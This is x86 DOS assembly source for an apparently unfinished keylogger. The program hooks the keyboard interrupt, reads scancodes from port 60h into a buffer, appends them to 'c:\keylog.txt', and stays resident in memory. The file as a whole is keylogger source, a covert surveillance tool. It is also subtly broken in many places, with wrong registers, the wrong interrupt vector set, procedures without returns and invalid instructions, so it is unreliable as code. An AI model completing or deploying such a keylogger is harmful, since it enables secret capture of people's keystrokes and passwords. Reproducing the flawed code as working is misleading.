.286
.model tiny
.code 
org 100h
locals @@

Start:

		mov dx, 9h * 4h ;addr of int 9h

		xor ax, ax
		mov ds, ax


		cli
		

	;saving addr of old 9h
		mov ax, word ptr es:[dx]  		
		mov word ptr old_9h_o, dx 		;offset
		
		mov ax, word ptr ds:[dx + 2]
		mov word ptr old_9h_s, dx  		;segment


	;rewriting addr of old 9h to new 9h in memory
		mov ax, 2521h					
		mov dx, offset new_9h
		int 21h


		sti


	;staying resident in memory
		mov ax, 3100h;
		int 21h;


new_9h proc
		pushf
		pusha

		

		popa
		popf

	;call original int 9h
		db 0eah;
		old_9h_o dw ?
		old_9h_s dw ?
	
	;;returning to the original function
	;;	jmp dword ptr cs:[old_9h_o]

		endp
		

proc read_to_buff

		pusha


	;saving pressed key
		in al, 60h;	

	;setting dl as head
		mov dl, buff 	
		add dl, buff_head
	
	;setting bl as tail
		mov bl, buff 	
		add bl, buff_tail
	
	;writing pressed key to the buffer
		mov cs:[bx], al
	
	;adjusting tail
		inc dx
		mov cs:[buff_tail], dl

	;skipping key release
		in al, 60h;
		xor al, al

	

		popa
		endp


proc flush_buff

		pusha   ;saving regs
	
	;opening file by adress in ds:dx and saving its handler  
		mov ax, 3d02h; 
		mov dx, offset log_file;
		int 21h
		mov file_handler, ax


	;moving cursor to the end of file
		mov ax, 4202h
		mov bx, file_handler
		xor cx, cx
		xor dx, dx
		int 21h


	;setting dl as head
		mov dl, buff 	
		add dl, buff_head
	
	;setting bl as tail
		mov bl, buff 	
		add bl, buff_tail


	;counting num of symbols to write
		push dl
		sub dl, bl
		mov cl, dl
		pop dl

	;writing symbols to file
		push bx
		push dx
		mov ah, 40h
		mov bx, file_handler
		xor ch, ch
		xor dh, dh
		int 21h
		pop dx
		pop bx

	;moving head
		mov dl, bl
		mov cs:[buff_head], dl


	;closing file
		mov ah, 3eh
		mov bx, file_handler
		int 21h


		popa    ;fixing regs

		endp

log_file = db 'c:\keylog.txt', 0
file_handler = db ?

cur_key db '33'

buff db 256 dup (?)
buff_head db 0 
buff_tail db 0

end_label:
end Start
